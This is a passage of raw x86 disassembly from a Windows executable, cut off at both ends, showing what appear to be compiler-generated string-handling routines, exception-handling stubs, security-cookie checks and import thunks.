  404f5e:	test   esi,esi
  404f60:	jne    0x404f70
  404f62:	and    DWORD PTR [ecx+0x10],esi
  404f65:	cmp    DWORD PTR [ecx+0x14],0x10
  404f69:	jb     0x404f6d
  404f6b:	mov    ecx,DWORD PTR [ecx]
  404f6d:	mov    BYTE PTR [ecx],0x0
  404f70:	xor    eax,eax
  404f72:	cmp    eax,esi
  404f74:	pop    esi
  404f75:	sbb    eax,eax
  404f77:	neg    eax
  404f79:	pop    ebp
  404f7a:	ret    0x8
  404f7d:	call   0x405039
  404f82:	int3   
  404f83:	int3   
  404f84:	int3   
  404f85:	int3   
  404f86:	int3   
  404f87:	int3   
  404f88:	mov    edi,edi
  404f8a:	push   ebp
  404f8b:	mov    ebp,esp
  404f8d:	mov    edx,DWORD PTR [ebp+0x8]
  404f90:	test   edx,edx
  404f92:	je     0x404fbf
  404f94:	cmp    DWORD PTR [ecx+0x14],0x10
  404f98:	jb     0x404f9e
  404f9a:	mov    eax,DWORD PTR [ecx]
  404f9c:	jmp    0x404fa0
  404f9e:	mov    eax,ecx
  404fa0:	cmp    edx,eax
  404fa2:	jb     0x404fbf
  404fa4:	cmp    DWORD PTR [ecx+0x14],0x10
  404fa8:	push   esi
  404fa9:	jb     0x404faf
  404fab:	mov    esi,DWORD PTR [ecx]
  404fad:	jmp    0x404fb1
  404faf:	mov    esi,ecx
  404fb1:	mov    eax,DWORD PTR [ecx+0x10]
  404fb4:	add    eax,esi
  404fb6:	pop    esi
  404fb7:	cmp    eax,edx
  404fb9:	jbe    0x404fbf
  404fbb:	mov    al,0x1
  404fbd:	jmp    0x404fc1
  404fbf:	xor    al,al
  404fc1:	pop    ebp
  404fc2:	ret    0x4
  404fc5:	int3   
  404fc6:	int3   
  404fc7:	int3   
  404fc8:	int3   
  404fc9:	int3   
  404fca:	mov    edi,edi
  404fcc:	push   ebp
  404fcd:	mov    ebp,esp
  404fcf:	cmp    BYTE PTR [ebp+0x8],0x0
  404fd3:	push   esi
  404fd4:	push   edi
  404fd5:	mov    edi,DWORD PTR [ebp+0xc]
  404fd8:	mov    esi,ecx
  404fda:	je     0x404ffc
  404fdc:	cmp    DWORD PTR [esi+0x14],0x10
  404fe0:	jb     0x404ffc
  404fe2:	push   ebx
  404fe3:	mov    ebx,DWORD PTR [esi]
  404fe5:	test   edi,edi
  404fe7:	je     0x404ff4
  404fe9:	push   edi
  404fea:	push   ebx
  404feb:	push   esi
  404fec:	call   0x40561e
  404ff1:	add    esp,0xc
  404ff4:	push   ebx
  404ff5:	call   0x4041ea
  404ffa:	pop    ecx
  404ffb:	pop    ebx
  404ffc:	mov    DWORD PTR [esi+0x10],edi
  404fff:	mov    DWORD PTR [esi+0x14],0xf
  405006:	mov    BYTE PTR [edi+esi*1],0x0
  40500a:	pop    edi
  40500b:	pop    esi
  40500c:	pop    ebp
  40500d:	ret    0x8
  405010:	int3   
  405011:	int3   
  405012:	int3   
  405013:	int3   
  405014:	int3   
  405015:	mov    edi,edi
  405017:	push   ebp
  405018:	mov    ebp,esp
  40501a:	sub    esp,0xc
  40501d:	lea    ecx,[ebp-0xc]
  405020:	call   0x404cc8
  405025:	push   0x405930
  40502a:	lea    eax,[ebp-0xc]
  40502d:	push   eax
  40502e:	call   0x40552c
  405033:	int3   
  405034:	int3   
  405035:	int3   
  405036:	int3   
  405037:	int3   
  405038:	int3   
  405039:	push   0x401208
  40503e:	call   0x405049
  405043:	int3   
  405044:	int3   
  405045:	int3   
  405046:	int3   
  405047:	int3   
  405048:	int3   
  405049:	mov    edi,edi
  40504b:	push   ebp
  40504c:	mov    ebp,esp
  40504e:	sub    esp,0xc
  405051:	lea    ecx,[ebp-0xc]
  405054:	push   DWORD PTR [ebp+0x8]
  405057:	call   0x404d28
  40505c:	push   0x4059a0
  405061:	lea    eax,[ebp-0xc]
  405064:	push   eax
  405065:	call   0x40552c
  40506a:	int3   
  40506b:	int3   
  40506c:	int3   
  40506d:	int3   
  40506e:	int3   
  40506f:	int3   
  405070:	mov    edi,edi
  405072:	push   ebp
  405073:	mov    ebp,esp
  405075:	sub    esp,0xc
  405078:	lea    ecx,[ebp-0xc]
  40507b:	push   DWORD PTR [ebp+0x8]
  40507e:	call   0x404d28
  405083:	push   0x4059dc
  405088:	lea    eax,[ebp-0xc]
  40508b:	push   eax
  40508c:	call   0x40552c
  405091:	int3   
  405092:	int3   
  405093:	int3   
  405094:	int3   
  405095:	int3   
  405096:	int3   
  405097:	push   0x4011f0
  40509c:	call   0x405070
  4050a1:	int3   
  4050a2:	int3   
  4050a3:	int3   
  4050a4:	int3   
  4050a5:	int3   
  4050a6:	int3   
  4050a7:	mov    edi,edi
  4050a9:	push   ebp
  4050aa:	mov    ebp,esp
  4050ac:	mov    eax,DWORD PTR [ebp+0xc]
  4050af:	push   ebx
  4050b0:	mov    ebx,DWORD PTR [ebp+0x8]
  4050b3:	push   esi
  4050b4:	push   edi
  4050b5:	mov    esi,ecx
  4050b7:	mov    edi,DWORD PTR [ebx+0x10]
  4050ba:	cmp    edi,eax
  4050bc:	jb     0x405133
  4050be:	sub    edi,eax
  4050c0:	cmp    DWORD PTR [ebp+0x10],edi
  4050c3:	jae    0x4050c8
  4050c5:	mov    edi,DWORD PTR [ebp+0x10]
  4050c8:	cmp    esi,ebx
  4050ca:	jne    0x4050e3
  4050cc:	add    eax,edi
  4050ce:	push   eax
  4050cf:	call   0x40529f
  4050d4:	mov    eax,DWORD PTR [ebp+0xc]
  4050d7:	mov    ecx,esi
  4050d9:	push   eax
  4050da:	push   0x0
  4050dc:	call   0x4052d0
  4050e1:	jmp    0x40512a
  4050e3:	push   0x0
  4050e5:	push   edi
  4050e6:	call   0x404f22
  4050eb:	test   al,al
  4050ed:	je     0x40512a
  4050ef:	cmp    DWORD PTR [ebx+0x14],0x10
  4050f3:	jb     0x4050f7
  4050f5:	mov    ebx,DWORD PTR [ebx]
  4050f7:	cmp    DWORD PTR [esi+0x14],0x10
  4050fb:	jb     0x405101
  4050fd:	mov    ecx,DWORD PTR [esi]
  4050ff:	jmp    0x405103
  405101:	mov    ecx,esi
  405103:	test   edi,edi
  405105:	je     0x405117
  405107:	mov    eax,DWORD PTR [ebp+0xc]
  40510a:	push   edi
  40510b:	add    eax,ebx
  40510d:	push   eax
  40510e:	push   ecx
  40510f:	call   0x40561e
  405114:	add    esp,0xc
  405117:	cmp    DWORD PTR [esi+0x14],0x10
  40511b:	mov    DWORD PTR [esi+0x10],edi
  40511e:	jb     0x405124
  405120:	mov    eax,DWORD PTR [esi]
  405122:	jmp    0x405126
  405124:	mov    eax,esi
  405126:	mov    BYTE PTR [eax+edi*1],0x0
  40512a:	pop    edi
  40512b:	mov    eax,esi
  40512d:	pop    esi
  40512e:	pop    ebx
  40512f:	pop    ebp
  405130:	ret    0xc
  405133:	call   0x405097
  405138:	int3   
  405139:	int3   
  40513a:	int3   
  40513b:	int3   
  40513c:	int3   
  40513d:	int3   
  40513e:	mov    edi,edi
  405140:	push   ebp
  405141:	mov    ebp,esp
  405143:	push   ebx
  405144:	mov    ebx,DWORD PTR [ebp+0x8]
  405147:	push   esi
  405148:	push   ebx
  405149:	mov    esi,ecx
  40514b:	call   0x404f88
  405150:	test   al,al
  405152:	je     0x405170
  405154:	cmp    DWORD PTR [esi+0x14],0x10
  405158:	jb     0x40515e
  40515a:	mov    eax,DWORD PTR [esi]
  40515c:	jmp    0x405160
  40515e:	mov    eax,esi
  405160:	push   DWORD PTR [ebp+0xc]
  405163:	sub    ebx,eax
  405165:	mov    ecx,esi
  405167:	push   ebx
  405168:	push   esi
  405169:	call   0x4050a7
  40516e:	jmp    0x4051b3
  405170:	push   edi
  405171:	mov    edi,DWORD PTR [ebp+0xc]
  405174:	mov    ecx,esi
  405176:	push   0x0
  405178:	push   edi
  405179:	call   0x404f22
  40517e:	test   al,al
  405180:	je     0x4051b0
  405182:	cmp    DWORD PTR [esi+0x14],0x10
  405186:	jb     0x40518c
  405188:	mov    eax,DWORD PTR [esi]
  40518a:	jmp    0x40518e
  40518c:	mov    eax,esi
  40518e:	test   edi,edi
  405190:	je     0x40519d
  405192:	push   edi
  405193:	push   ebx
  405194:	push   eax
  405195:	call   0x40561e
  40519a:	add    esp,0xc
  40519d:	cmp    DWORD PTR [esi+0x14],0x10
  4051a1:	mov    DWORD PTR [esi+0x10],edi
  4051a4:	jb     0x4051aa
  4051a6:	mov    eax,DWORD PTR [esi]
  4051a8:	jmp    0x4051ac
  4051aa:	mov    eax,esi
  4051ac:	mov    BYTE PTR [eax+edi*1],0x0
  4051b0:	mov    eax,esi
  4051b2:	pop    edi
  4051b3:	pop    esi
  4051b4:	pop    ebx
  4051b5:	pop    ebp
  4051b6:	ret    0x8
  4051b9:	int3   
  4051ba:	int3   
  4051bb:	int3   
  4051bc:	int3   
  4051bd:	int3   
  4051be:	int3   
  4051bf:	int3   
  4051c0:	mov    edi,edi
  4051c2:	push   ebp
  4051c3:	mov    ebp,esp
  4051c5:	push   esi
  4051c6:	mov    esi,DWORD PTR [ebp+0xc]
  4051c9:	push   esi
  4051ca:	call   0x40547b
  4051cf:	test   eax,eax
  4051d1:	mov    eax,DWORD PTR [ebp+0x8]
  4051d4:	pop    ecx
  4051d5:	mov    DWORD PTR [eax],esi
  4051d7:	je     0x4051e2
  4051d9:	mov    DWORD PTR [eax+0x4],0x40600c
  4051e0:	jmp    0x4051e9
  4051e2:	mov    DWORD PTR [eax+0x4],0x406014
  4051e9:	pop    esi
  4051ea:	pop    ebp
  4051eb:	ret    0x8
  4051ee:	int3   
  4051ef:	int3   
  4051f0:	int3   
  4051f1:	int3   
  4051f2:	int3   
  4051f3:	int3   
  4051f4:	int3   
  4051f5:	int3   
  4051f6:	int3   
  4051f7:	int3   
  4051f8:	int3   
  4051f9:	int3   
  4051fa:	int3   
  4051fb:	int3   
  4051fc:	int3   
  4051fd:	int3   
  4051fe:	int3   
  4051ff:	int3   
  405200:	mov    edi,edi
  405202:	push   ebp
  405203:	mov    ebp,esp
  405205:	mov    eax,DWORD PTR [ebp+0x8]
  405208:	mov    edx,DWORD PTR [ebp+0xc]
  40520b:	mov    DWORD PTR [eax],edx
  40520d:	mov    DWORD PTR [eax+0x4],ecx
  405210:	pop    ebp
  405211:	ret    0x8
  405214:	int3   
  405215:	int3   
  405216:	int3   
  405217:	int3   
  405218:	int3   
  405219:	int3   
  40521a:	int3   
  40521b:	int3   
  40521c:	int3   
  40521d:	int3   
  40521e:	int3   
  40521f:	int3   
  405220:	mov    edi,edi
  405222:	push   ebp
  405223:	mov    ebp,esp
  405225:	mov    eax,DWORD PTR [ebp+0x8]
  405228:	cmp    ecx,DWORD PTR [eax+0x4]
  40522b:	jne    0x405239
  40522d:	mov    eax,DWORD PTR [eax]
  40522f:	cmp    eax,DWORD PTR [ebp+0xc]
  405232:	jne    0x405239
  405234:	xor    eax,eax
  405236:	inc    eax
  405237:	jmp    0x40523b
  405239:	xor    eax,eax
  40523b:	pop    ebp
  40523c:	ret    0x8
  40523f:	int3   
  405240:	int3   
  405241:	int3   
  405242:	int3   
  405243:	int3   
  405244:	int3   
  405245:	int3   
  405246:	int3   
  405247:	int3   
  405248:	int3   
  405249:	int3   
  40524a:	int3   
  40524b:	int3   
  40524c:	int3   
  40524d:	int3   
  40524e:	int3   
  40524f:	int3   
  405250:	mov    edi,edi
  405252:	push   ebp
  405253:	mov    ebp,esp
  405255:	sub    esp,0xc
  405258:	mov    eax,ds:0x406004
  40525d:	xor    eax,ebp
  40525f:	mov    DWORD PTR [ebp-0x4],eax
  405262:	push   esi
  405263:	push   edi
  405264:	push   DWORD PTR [ebp+0xc]
  405267:	mov    edi,ecx
  405269:	lea    ecx,[ebp-0xc]
  40526c:	push   DWORD PTR [ebp+0x8]
  40526f:	push   ecx
  405270:	mov    eax,DWORD PTR [edi]
  405272:	mov    esi,DWORD PTR [eax+0xc]
  405275:	mov    ecx,esi
  405277:	call   DWORD PTR ds:0x40717c
  40527d:	mov    ecx,edi
  40527f:	call   esi
  405281:	mov    ecx,eax
  405283:	call   0x404d7a
  405288:	mov    ecx,DWORD PTR [ebp-0x4]
  40528b:	pop    edi
  40528c:	xor    ecx,ebp
  40528e:	pop    esi
  40528f:	call   0x404560
  405294:	mov    esp,ebp
  405296:	pop    ebp
  405297:	ret    0x8
  40529a:	int3   
  40529b:	int3   
  40529c:	int3   
  40529d:	int3   
  40529e:	int3   
  40529f:	mov    edi,edi
  4052a1:	push   ebp
  4052a2:	mov    ebp,esp
  4052a4:	mov    eax,DWORD PTR [ebp+0x8]
  4052a7:	cmp    DWORD PTR [ecx+0x10],eax
  4052aa:	jb     0x4052c5
  4052ac:	cmp    DWORD PTR [ecx+0x14],0x10
  4052b0:	mov    DWORD PTR [ecx+0x10],eax
  4052b3:	jb     0x4052b9
  4052b5:	mov    edx,DWORD PTR [ecx]
  4052b7:	jmp    0x4052bb
  4052b9:	mov    edx,ecx
  4052bb:	mov    BYTE PTR [edx+eax*1],0x0
  4052bf:	mov    eax,ecx
  4052c1:	pop    ebp
  4052c2:	ret    0x4
  4052c5:	call   0x405097
  4052ca:	int3   
  4052cb:	int3   
  4052cc:	int3   
  4052cd:	int3   
  4052ce:	int3   
  4052cf:	int3   
  4052d0:	mov    edi,edi
  4052d2:	push   ebp
  4052d3:	mov    ebp,esp
  4052d5:	push   esi
  4052d6:	mov    esi,ecx
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	push   edi
  4052dc:	mov    edi,DWORD PTR [esi+0x10]
  4052df:	cmp    edi,ecx
  4052e1:	jb     0x40534a
  4052e3:	mov    edx,DWORD PTR [ebp+0xc]
  4052e6:	mov    eax,edi
  4052e8:	sub    eax,ecx
  4052ea:	cmp    eax,edx
  4052ec:	ja     0x405303
  4052ee:	cmp    DWORD PTR [esi+0x14],0x10
  4052f2:	mov    DWORD PTR [esi+0x10],ecx
  4052f5:	jb     0x4052fb
  4052f7:	mov    eax,DWORD PTR [esi]
  4052f9:	jmp    0x4052fd
  4052fb:	mov    eax,esi
  4052fd:	mov    BYTE PTR [eax+ecx*1],0x0
  405301:	jmp    0x405342
  405303:	test   edx,edx
  405305:	je     0x405342
  405307:	cmp    DWORD PTR [esi+0x14],0x10
  40530b:	jb     0x405311
  40530d:	mov    eax,DWORD PTR [esi]
  40530f:	jmp    0x405313
  405311:	mov    eax,esi
  405313:	sub    edi,edx
  405315:	push   ebx
  405316:	lea    ebx,[eax+ecx*1]
  405319:	mov    eax,edi
  40531b:	sub    eax,ecx
  40531d:	je     0x40532e
  40531f:	push   eax
  405320:	lea    eax,[ebx+edx*1]
  405323:	push   eax
  405324:	push   ebx
  405325:	call   DWORD PTR ds:0x40712c
  40532b:	add    esp,0xc
  40532e:	cmp    DWORD PTR [esi+0x14],0x10
  405332:	mov    DWORD PTR [esi+0x10],edi
  405335:	pop    ebx
  405336:	jb     0x40533c
  405338:	mov    eax,DWORD PTR [esi]
  40533a:	jmp    0x40533e
  40533c:	mov    eax,esi
  40533e:	mov    BYTE PTR [eax+edi*1],0x0
  405342:	pop    edi
  405343:	mov    eax,esi
  405345:	pop    esi
  405346:	pop    ebp
  405347:	ret    0x8
  40534a:	mov    ecx,esi
  40534c:	call   0x405097
  405351:	int3   
  405352:	int3   
  405353:	int3   
  405354:	int3   
  405355:	int3   
  405356:	int3   
  405357:	mov    edi,edi
  405359:	push   ebp
  40535a:	mov    ebp,esp
  40535c:	mov    eax,DWORD PTR [ebp+0x8]
  40535f:	cmp    BYTE PTR [eax],0x0
  405362:	jne    0x405368
  405364:	xor    eax,eax
  405366:	pop    ebp
  405367:	ret    
  405368:	lea    edx,[eax+0x1]
  40536b:	mov    cl,BYTE PTR [eax]
  40536d:	inc    eax
  40536e:	test   cl,cl
  405370:	jne    0x40536b
  405372:	sub    eax,edx
  405374:	pop    ebp
  405375:	ret    
  405376:	int3   
  405377:	int3   
  405378:	int3   
  405379:	int3   
  40537a:	int3   
  40537b:	int3   
  40537c:	int3   
  40537d:	int3   
  40537e:	int3   
  40537f:	int3   
  405380:	mov    edi,edi
  405382:	push   ebp
  405383:	mov    ebp,esp
  405385:	push   ecx
  405386:	push   DWORD PTR [ebp+0xc]
  405389:	and    DWORD PTR [ebp-0x4],0x0
  40538d:	call   0x40547b
  405392:	pop    ecx
  405393:	test   eax,eax
  405395:	jne    0x40539c
  405397:	mov    eax,0x401184
  40539c:	mov    ecx,DWORD PTR [ebp+0x8]
  40539f:	push   eax
  4053a0:	call   0x404c67
  4053a5:	mov    eax,DWORD PTR [ebp+0x8]
  4053a8:	mov    esp,ebp
  4053aa:	pop    ebp
  4053ab:	ret    0x8
  4053ae:	int3   
  4053af:	int3   
  4053b0:	int3   
  4053b1:	int3   
  4053b2:	int3   
  4053b3:	int3   
  4053b4:	int3   
  4053b5:	int3   
  4053b6:	int3   
  4053b7:	int3   
  4053b8:	int3   
  4053b9:	int3   
  4053ba:	int3   
  4053bb:	int3   
  4053bc:	int3   
  4053bd:	int3   
  4053be:	int3   
  4053bf:	int3   
  4053c0:	mov    edi,edi
  4053c2:	push   ebp
  4053c3:	mov    ebp,esp
  4053c5:	push   ecx
  4053c6:	and    DWORD PTR [ebp-0x4],0x0
  4053ca:	cmp    DWORD PTR [ebp+0xc],0x1
  4053ce:	jne    0x4053df
  4053d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4053d3:	push   0x4011b8
  4053d8:	call   0x404c67
  4053dd:	jmp    0x4053ea
  4053df:	push   DWORD PTR [ebp+0xc]
  4053e2:	push   DWORD PTR [ebp+0x8]
  4053e5:	call   0x405380
  4053ea:	mov    eax,DWORD PTR [ebp+0x8]
  4053ed:	mov    esp,ebp
  4053ef:	pop    ebp
  4053f0:	ret    0x8
  4053f3:	int3   
  4053f4:	int3   
  4053f5:	int3   
  4053f6:	int3   
  4053f7:	int3   
  4053f8:	int3   
  4053f9:	int3   
  4053fa:	int3   
  4053fb:	int3   
  4053fc:	int3   
  4053fd:	int3   
  4053fe:	int3   
  4053ff:	int3   
  405400:	mov    edi,edi
  405402:	push   ebp
  405403:	mov    ebp,esp
  405405:	push   ecx
  405406:	push   DWORD PTR [ebp+0xc]
  405409:	and    DWORD PTR [ebp-0x4],0x0
  40540d:	call   0x4054ac
  405412:	pop    ecx
  405413:	test   eax,eax
  405415:	jne    0x40541c
  405417:	mov    eax,0x401184
  40541c:	mov    ecx,DWORD PTR [ebp+0x8]
  40541f:	push   eax
  405420:	call   0x404c67
  405425:	mov    eax,DWORD PTR [ebp+0x8]
  405428:	mov    esp,ebp
  40542a:	pop    ebp
  40542b:	ret    0x8
  40542e:	int3   
  40542f:	int3   
  405430:	int3   
  405431:	int3   
  405432:	int3   
  405433:	int3   
  405434:	int3   
  405435:	int3   
  405436:	int3   
  405437:	int3   
  405438:	int3   
  405439:	int3   
  40543a:	int3   
  40543b:	int3   
  40543c:	int3   
  40543d:	int3   
  40543e:	int3   
  40543f:	int3   
  405440:	mov    eax,0x40117c
  405445:	ret    
  405446:	int3   
  405447:	int3   
  405448:	int3   
  405449:	int3   
  40544a:	int3   
  40544b:	int3   
  40544c:	int3   
  40544d:	int3   
  40544e:	int3   
  40544f:	int3   
  405450:	mov    eax,0x4011ac
  405455:	ret    
  405456:	int3   
  405457:	int3   
  405458:	int3   
  405459:	int3   
  40545a:	int3   
  40545b:	int3   
  40545c:	int3   
  40545d:	int3   
  40545e:	int3   
  40545f:	int3   
  405460:	mov    eax,0x4011e8
  405465:	ret    
  405466:	int3   
  405467:	int3   
  405468:	int3   
  405469:	int3   
  40546a:	int3   
  40546b:	mov    edi,edi
  40546d:	push   ebp
  40546e:	mov    ebp,esp
  405470:	pop    ebp
  405471:	jmp    0x404c2e
  405476:	int3   
  405477:	int3   
  405478:	int3   
  405479:	int3   
  40547a:	int3   
  40547b:	mov    edi,edi
  40547d:	push   ebp
  40547e:	mov    ebp,esp
  405480:	cmp    DWORD PTR ds:0x401844,0x0
  405487:	mov    eax,0x401840
  40548c:	je     0x40549e
  40548e:	mov    ecx,DWORD PTR [ebp+0x8]
  405491:	cmp    DWORD PTR [eax],ecx
  405493:	je     0x4054a2
  405495:	add    eax,0x8
  405498:	cmp    DWORD PTR [eax+0x4],0x0
  40549c:	jne    0x405491
  40549e:	xor    eax,eax
  4054a0:	pop    ebp
  4054a1:	ret    
  4054a2:	mov    eax,DWORD PTR [eax+0x4]
  4054a5:	pop    ebp
  4054a6:	ret    
  4054a7:	int3   
  4054a8:	int3   
  4054a9:	int3   
  4054aa:	int3   
  4054ab:	int3   
  4054ac:	mov    edi,edi
  4054ae:	push   ebp
  4054af:	mov    ebp,esp
  4054b1:	cmp    DWORD PTR ds:0x40121c,0x0
  4054b8:	mov    eax,0x401218
  4054bd:	je     0x4054cf
  4054bf:	mov    ecx,DWORD PTR [ebp+0x8]
  4054c2:	cmp    DWORD PTR [eax],ecx
  4054c4:	je     0x4054d3
  4054c6:	add    eax,0x8
  4054c9:	cmp    DWORD PTR [eax+0x4],0x0
  4054cd:	jne    0x4054c2
  4054cf:	xor    eax,eax
  4054d1:	pop    ebp
  4054d2:	ret    
  4054d3:	mov    eax,DWORD PTR [eax+0x4]
  4054d6:	pop    ebp
  4054d7:	ret    
  4054d8:	int3   
  4054d9:	int3   
  4054da:	int3   
  4054db:	int3   
  4054dc:	int3   
  4054dd:	int3   
  4054de:	jmp    DWORD PTR ds:0x407140
  4054e4:	int3   
  4054e5:	int3   
  4054e6:	int3   
  4054e7:	int3   
  4054e8:	int3   
  4054e9:	int3   
  4054ea:	jmp    DWORD PTR ds:0x407144
  4054f0:	int3   
  4054f1:	int3   
  4054f2:	int3   
  4054f3:	int3   
  4054f4:	int3   
  4054f5:	int3   
  4054f6:	int3   
  4054f7:	int3   
  4054f8:	int3   
  4054f9:	int3   
  4054fa:	int3   
  4054fb:	int3   
  4054fc:	int3   
  4054fd:	int3   
  4054fe:	int3   
  4054ff:	int3   
  405500:	jmp    DWORD PTR ds:0x407148
  405506:	int3   
  405507:	int3   
  405508:	int3   
  405509:	int3   
  40550a:	int3   
  40550b:	int3   
  40550c:	jmp    DWORD PTR ds:0x40714c
  405512:	int3   
  405513:	int3   
  405514:	int3   
  405515:	int3   
  405516:	int3   
  405517:	int3   
  405518:	int3   
  405519:	int3   
  40551a:	int3   
  40551b:	int3   
  40551c:	int3   
  40551d:	int3   
  40551e:	int3   
  40551f:	int3   
  405520:	jmp    DWORD PTR ds:0x407150
  405526:	int3   
  405527:	int3   
  405528:	int3   
  405529:	int3   
  40552a:	int3   
  40552b:	int3   
  40552c:	jmp    DWORD PTR ds:0x407154
  405532:	int3   
  405533:	int3   
  405534:	int3   
  405535:	int3   
  405536:	int3   
  405537:	mov    ecx,DWORD PTR [ebp-0xc]
  40553a:	mov    DWORD PTR fs:0x0,ecx
  405541:	pop    ecx
  405542:	pop    edi
  405543:	pop    edi
  405544:	pop    esi
  405545:	pop    ebx
  405546:	mov    esp,ebp
  405548:	pop    ebp
  405549:	push   ecx
  40554a:	ret    
  40554b:	int3   
  40554c:	int3   
  40554d:	int3   
  40554e:	int3   
  40554f:	int3   
  405550:	mov    ecx,DWORD PTR [ebp-0x10]
  405553:	xor    ecx,ebp
  405555:	call   0x404560
  40555a:	jmp    0x405537
  40555f:	int3   
  405560:	int3   
  405561:	int3   
  405562:	int3   
  405563:	int3   
  405564:	push   eax
  405565:	push   DWORD PTR fs:0x0
  40556c:	lea    eax,[esp+0xc]
  405570:	sub    esp,DWORD PTR [esp+0xc]
  405574:	push   ebx
  405575:	push   esi
  405576:	push   edi
  405577:	mov    DWORD PTR [eax],ebp
  405579:	mov    ebp,eax
  40557b:	mov    eax,ds:0x406004
  405580:	xor    eax,ebp
  405582:	push   eax
  405583:	push   DWORD PTR [ebp-0x4]
  405586:	mov    DWORD PTR [ebp-0x4],0xffffffff
  40558d:	lea    eax,[ebp-0xc]
  405590:	mov    fs:0x0,eax
  405596:	ret    
  405597:	int3   
  405598:	int3   
  405599:	int3   
  40559a:	int3   
  40559b:	int3   
  40559c:	push   eax
  40559d:	push   DWORD PTR fs:0x0
  4055a4:	lea    eax,[esp+0xc]
  4055a8:	sub    esp,DWORD PTR [esp+0xc]
  4055ac:	push   ebx
  4055ad:	push   esi
  4055ae:	push   edi
  4055af:	mov    DWORD PTR [eax],ebp
  4055b1:	mov    ebp,eax
  4055b3:	mov    eax,ds:0x406004
  4055b8:	xor    eax,ebp
  4055ba:	push   eax
  4055bb:	mov    DWORD PTR [ebp-0x10],eax
  4055be:	push   DWORD PTR [ebp-0x4]
  4055c1:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4055c8:	lea    eax,[ebp-0xc]
  4055cb:	mov    fs:0x0,eax
  4055d1:	ret    
  4055d2:	int3   
  4055d3:	int3   
  4055d4:	int3   
  4055d5:	int3   
  4055d6:	int3   
  4055d7:	push   eax
  4055d8:	push   DWORD PTR fs:0x0
  4055df:	lea    eax,[esp+0xc]
  4055e3:	sub    esp,DWORD PTR [esp+0xc]
  4055e7:	push   ebx
  4055e8:	push   esi
  4055e9:	push   edi
  4055ea:	mov    DWORD PTR [eax],ebp
  4055ec:	mov    ebp,eax
  4055ee:	mov    eax,ds:0x406004
  4055f3:	xor    eax,ebp
  4055f5:	push   eax
  4055f6:	mov    DWORD PTR [ebp-0x10],esp
  4055f9:	push   DWORD PTR [ebp-0x4]
  4055fc:	mov    DWORD PTR [ebp-0x4],0xffffffff
  405603:	lea    eax,[ebp-0xc]
  405606:	mov    fs:0x0,eax
  40560c:	ret    
  40560d:	int3   
  40560e:	int3   
  40560f:	int3   
  405610:	int3   
  405611:	int3   
  405612:	jmp    DWORD PTR ds:0x407158
  405618:	int3   
  405619:	int3   
  40561a:	int3   
  40561b:	int3   
  40561c:	int3   
  40561d:	int3   
  40561e:	jmp    DWORD PTR ds:0x40715c
  405624:	int3   
  405625:	int3   
  405626:	int3   
  405627:	int3   
  405628:	int3   
  405629:	int3   
  40562a:	jmp    DWORD PTR ds:0x407164
  405630:	int3   
  405631:	int3   
  405632:	int3   
  405633:	int3   
  405634:	int3   
  405635:	mov    ecx,DWORD PTR [ebp-0x14]
  405638:	jmp    0x403a92
  40563d:	mov    edx,DWORD PTR [esp+0x8]
  405641:	lea    eax,[edx+0xc]
  405644:	mov    ecx,DWORD PTR [edx-0x18]
  405647:	xor    ecx,eax
  405649:	call   0x404560
  40564e:	mov    ecx,DWORD PTR [edx-0x4]
  405651:	xor    ecx,eax
  405653:	call   0x404560
  405658:	mov    eax,0x4057c0
  40565d:	jmp    0x405612
  405662:	int3   
  405663:	int3   
  405664:	int3   
  405665:	int3   
  405666:	int3   
  405667:	lea    ecx,[ebp-0x10]
  40566a:	jmp    0x403e0f
  40566f:	lea    ecx,[ebp-0x24]
  405672:	jmp    0x40385a
  405677:	mov    edx,DWORD PTR [esp+0x8]
  40567b:	lea    eax,[edx+0xc]
  40567e:	mov    ecx,DWORD PTR [edx-0x28]
  405681:	xor    ecx,eax
  405683:	call   0x404560
  405688:	mov    eax,0x4057ec
  40568d:	jmp    0x405612
  405692:	int3   
  405693:	int3   
  405694:	int3   
  405695:	int3   
  405696:	int3   
  405697:	mov    edx,DWORD PTR [esp+0x8]
  40569b:	lea    eax,[edx+0xc]
  40569e:	mov    ecx,DWORD PTR [edx-0x20]
  4056a1:	xor    ecx,eax
  4056a3:	call   0x404560
  4056a8:	mov    eax,0x4058e4
  4056ad:	jmp    0x405612
  4056b2:	int3   
  4056b3:	int3   
  4056b4:	int3   
  4056b5:	int3   
  4056b6:	int3   
  4056b7:	int3   
  4056b8:	int3   
  4056b9:	int3   
  4056ba:	int3   
  4056bb:	int3   
  4056bc:	int3   
  4056bd:	int3   
  4056be:	int3   
  4056bf:	int3   
  4056c0:	mov    edi,edi
  4056c2:	push   ebp
  4056c3:	mov    ebp,esp
  4056c5:	push   ecx
  4056c6:	push   ecx
  4056c7:	lea    eax,[ebp-0x8]
  4056ca:	push   eax
  4056cb:	lea    eax,[ebp-0x4]
  4056ce:	push   eax
  4056cf:	push   0x0
  4056d1:	push   0x406548
  4056d6:	call   DWORD PTR ds:0x4070a8
  4056dc:	test   eax,eax
  4056de:	je     0x4056ee
  4056e0:	cmp    DWORD PTR [ebp-0x4],0x0
  4056e4:	jne    0x4056ee
  4056e6:	mov    ecx,DWORD PTR [ebp-0x8]
  4056e9:	call   0x403617
  4056ee:	mov    esp,ebp
  4056f0:	pop    ebp
  4056f1:	ret    
  4056f2:	int3   
  4056f3:	int3   
  4056f4:	int3   
  4056f5:	int3   
  4056f6:	int3   
  4056f7:	int3   
  4056f8:	int3   
  4056f9:	int3   
  4056fa:	int3   
  4056fb:	int3   
  4056fc:	int3   
  4056fd:	int3   
  4056fe:	int3   
  4056ff:	int3   
  405700:	mov    edi,edi
  405702:	push   ebp
  405703:	mov    ebp,esp
  405705:	push   ecx
  405706:	mov    eax,ds:0x406004
  40570b:	xor    eax,ebp
  40570d:	mov    DWORD PTR [ebp-0x4],eax
  405710:	mov    eax,ds:0x40656c
  405715:	test   eax,eax
  405717:	je     0x405720
  405719:	push   eax
  40571a:	call   DWORD PTR ds:0x407034
  405720:	push   edi
  405721:	mov    edi,DWORD PTR ds:0x406500
  405727:	test   edi,edi
  405729:	je     0x405746
  40572b:	mov    eax,DWORD PTR [edi]
  40572d:	push   esi
  40572e:	push   0x1
  405730:	mov    esi,DWORD PTR [eax]
  405732:	mov    ecx,esi
  405734:	call   DWORD PTR ds:0x40717c
  40573a:	mov    ecx,edi
  40573c:	call   esi
  40573e:	and    DWORD PTR ds:0x406500,0x0
  405745:	pop    esi
  405746:	mov    ecx,DWORD PTR [ebp-0x4]
  405749:	xor    ecx,ebp
